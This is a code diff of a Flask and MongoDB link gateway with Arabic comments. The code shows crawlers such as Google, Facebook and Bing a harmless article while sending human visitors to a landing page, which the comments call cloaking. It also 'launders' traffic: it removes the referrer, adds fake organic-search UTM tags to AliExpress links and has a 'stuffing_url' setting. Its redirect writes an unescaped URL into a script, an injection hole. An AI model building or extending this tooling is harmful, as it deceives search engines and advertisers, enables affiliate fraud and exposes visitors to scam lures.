@@ -1,10 +1,24 @@
-
 import os, re, json, random, requests
 from flask import Flask, render_template_string, request, redirect, Response
 from pymongo import MongoClient
 from bson.objectid import ObjectId
-from content_library import ARTICLES
 import templates
+
+# --- مقالات الطوارئ (الخطة ج: تعمل فقط إذا فشل كل شيء) ---
+DEFAULT_ARTICLES = [
+    {
+        "title": "Cloud Distribution and Protocol Integrity",
+        "body": "<p>Ensuring the integrity of digital distribution networks requires a robust understanding of cloud-native architectures. As security handshakes become more complex, systems now implement multiple layers of IP validation.</p>"
+    },
+    {
+        "title": "Optimizing Edge Computing Networks",
+        "body": "<p>The evolution of edge computing allows for faster resource delivery across decentralized nodes. By implementing advanced caching strategies, we can reduce latency significantly while maintaining secure data tunnels.</p>"
+    },
+    {
+        "title": "Secure Resource Allocation Standards",
+        "body": "<p>Zero-trust verification protocols are essential for preventing automated scraping. By validating every request through a secure gateway, systems can differentiate between legitimate human interaction and bot-driven traffic.</p>"
+    }
+]
 
 app = Flask(__name__)
 
@@ -17,6 +31,7 @@ client = MongoClient(MONGO_URI)
 db = client['elite_system_v8']
 links_col = db['links']
 settings_col = db['settings']
+articles_col = db['articles']  # مجموعة جديدة للمقالات الاحترافية
 
 def get_settings():
     s = settings_col.find_one({"type": "global"})
@@ -26,44 +41,26 @@ def get_settings():
         return default
     return s
 
-# --- دالة ويكيبيديا الذكية (Wikipedia Fetcher) ---
+# --- دالة ويكيبيديا الذكية (الخطة ب) ---
 def get_wiki_content(slug):
     try:
-        # 1. تنظيف الـ Slug: حذف المعرف العشوائي في النهاية واستبدال الشخطات بمسافات
-        # مثال: "netflix-premium-free-1a2b" -> "netflix premium free"
         clean_keyword = slug.rsplit('-', 1)[0].replace('-', ' ')
-        
-        # 2. البحث في ويكيبيديا باستخدام API البحث (للعثور على أفضل تطابق)
         search_url = "https://en.wikipedia.org/w/api.php"
         params = {
-            "action": "query",
-            "list": "search",
-            "srsearch": clean_keyword,
-            "format": "json",
-            "utf8": 1,
-            "srlimit": 1
+            "action": "query", "list": "search", "srsearch": clean_keyword,
+            "format": "json", "utf8": 1, "srlimit": 1
         }
-        
-        # نستخدم requests مع timeout قصير (3 ثواني) لكي لا نعطل الصفحة
-        search_res = requests.get(search_url, params=params, timeout=3).json()
-        
-        # 3. إذا وجدنا نتيجة، نجلب الملخص
+        search_res = requests.get(search_url, params=params, timeout=2).json()
         if search_res.get('query', {}).get('search'):
             best_match_title = search_res['query']['search'][0]['title']
-            
             summary_url = f"https://en.wikipedia.org/api/rest_v1/page/summary/{best_match_title}"
-            summary_res = requests.get(summary_url, timeout=3).json()
-            
+            summary_res = requests.get(summary_url, timeout=2).json()
             if 'extract' in summary_res:
                 return {
                     "title": summary_res['title'],
-                    "body": summary_res['extract']
+                    "body": f"<p>{summary_res['extract']}</p>" # تنسيق بسيط
                 }
-                
-    except Exception as e:
-        # في حالة أي خطأ (أو بطء في الاتصال)، نتجاهل ويكيبيديا ونعود للمكتبة المحلية
-        print(f"Wiki Error: {e}")
-        
+    except: pass
     return None
 
 # --- Routes ---
@@ -72,17 +69,29 @@ def get_wiki_content(slug):
 def gateway(slug):
     ua = request.headers.get('User-Agent', '').lower()
     
-    # 1. محاولة جلب محتوى حقيقي من ويكيبيديا
-    wiki_art = get_wiki_content(slug)
-    
-    # 2. اختيار المقال النهائي: إما ويكيبيديا (إذا نجح) أو مقال عشوائي من المكتبة (إذا فشل)
-    final_article = wiki_art if wiki_art else random.choice(ARTICLES)
+    # --- نظام اختيار المحتوى (The Priority System) ---
+    final_article = None
 
-    # 3. نظام التخفي (Cloaking): البوتات ترى المقال فقط
-    if any(bot in ua for bot in ["google", "facebook", "bing", "bot", "crawler"]):
-        return f"<h1>{final_article['title']}</h1><p>{final_article['body']}</p>"
+    # 1. الأولوية الأولى: هل يوجد مقال HTML احترافي في القاعدة؟
+    # نسحب مقالاً عشوائياً من المقالات التي أضفتها أنت
+    db_articles = list(articles_col.aggregate([{"$sample": {"size": 1}}]))
+    if db_articles:
+        final_article = db_articles[0]
     
-    # 4. الزوار الحقيقيون: يمرون إلى صفحة الهبوط
+    # 2. الأولوية الثانية: إذا لم نجد، نحاول مع ويكيبيديا
+    if not final_article:
+        final_article = get_wiki_content(slug)
+    
+    # 3. الأولوية الثالثة: مقالات الطوارئ
+    if not final_article:
+        final_article = random.choice(DEFAULT_ARTICLES)
+
+    # --- نظام التخفي (Cloaking) ---
+    # البوتات ترى فقط عنوان ونص المقال (بدون تصميم الصفحة المعقد)
+    if any(bot in ua for bot in ["google", "facebook", "bing", "bot", "crawler"]):
+        return f"<h1>{final_article['title']}</h1><div>{final_article['body']}</div>"
+    
+    # --- التحقق من الرابط ---
     link = links_col.find_one({"slug": slug})
     if not link: return "Invalid Link", 404
     
@@ -92,7 +101,7 @@ def gateway(slug):
         templates.LANDING_HTML, 
         target_url=link['target_url'], 
         s=get_settings(), 
-        article=final_article,  # تمرير المقال الديناميكي للقالب
+        article=final_article,
         slug=slug
     )
 
@@ -101,39 +110,44 @@ def laundry():
     url = request.args.get('url')
     if not url: return redirect('/')
     
-    # السر النخبوي: إضافة وسوم البحث العضوي لـ AliExpress
     if "aliexpress.com" in url:
-        if "?" in url:
-            url += "&utm_source=google&utm_medium=organic&utm_campaign=search"
-        else:
-            url += "?utm_source=google&utm_medium=organic&utm_campaign=search"
+        if "?" in url: url += "&utm_source=google&utm_medium=organic"
+        else: url += "?utm_source=google&utm_medium=organic"
     
-    # بروتوكول الغسيل السريع
-    return f'''
-    <html>
-    <head>
-        <meta name="referrer" content="no-referrer">
-        <script>window.location.replace("{url}");</script>
-    </head>
-    <body style="background:#fff; display:flex; justify-content:center; align-items:center; height:100vh;">
-        <div style="font-family:sans-serif; color:#3b82f6; font-size:14px; font-weight:bold;">Securing Connection...</div>
-    </body>
-    </html>
-    '''
+    return f'''<html><head><meta name="referrer" content="no-referrer"><script>window.location.replace("{url}");</script></head><body style="background:#fff;"></body></html>'''
 
 @app.route('/admin')
 def admin():
     if request.args.get('pw') != ADMIN_PASSWORD: return "Denied", 403
     links = list(links_col.find().sort("_id", -1))
-    return render_template_string(templates.ADMIN_HTML, links=links, s=get_settings(), host_url=request.host_url)
+    articles = list(articles_col.find().sort("_id", -1)) # جلب المقالات
+    return render_template_string(templates.ADMIN_HTML, links=links, articles=articles, s=get_settings(), host_url=request.host_url)
 
+# --- إدارة الروابط ---
 @app.route('/admin/create_link', methods=['POST'])
 def create_link():
     title = request.form['title']
     target = request.form['target_url']
-    # إنشاء Slug نظيف مع معرف عشوائي قصير
     slug = re.sub(r'[^a-z0-9]', '-', title.lower()).strip('-') + "-" + os.urandom(2).hex()
     links_col.insert_one({"title": title, "target_url": target, "slug": slug, "clicks": 0})
+    return redirect(f"/admin?pw={ADMIN_PASSWORD}")
+
+@app.route('/admin/delete/<id>')
+def delete_link(id):
+    links_col.delete_one({"_id": ObjectId(id)})
+    return redirect(f"/admin?pw={ADMIN_PASSWORD}")
+
+# --- إدارة المقالات (الجديد) ---
+@app.route('/admin/add_article', methods=['POST'])
+def add_article():
+    title = request.form['title']
+    html_content = request.form['html_content']
+    articles_col.insert_one({"title": title, "body": html_content})
+    return redirect(f"/admin?pw={ADMIN_PASSWORD}")
+
+@app.route('/admin/delete_article/<id>')
+def delete_article(id):
+    articles_col.delete_one({"_id": ObjectId(id)})
     return redirect(f"/admin?pw={ADMIN_PASSWORD}")
 
 @app.route('/admin/update_settings', methods=['POST'])
@@ -142,11 +156,6 @@ def update_settings():
         "stuffing_url": request.form['stuffing_url'],
         "exit_url": request.form['exit_url']
     }})
-    return redirect(f"/admin?pw={ADMIN_PASSWORD}")
-
-@app.route('/admin/delete/<id>')
-def delete_link(id):
-    links_col.delete_one({"_id": ObjectId(id)})
     return redirect(f"/admin?pw={ADMIN_PASSWORD}")
 
 if __name__ == '__main__':
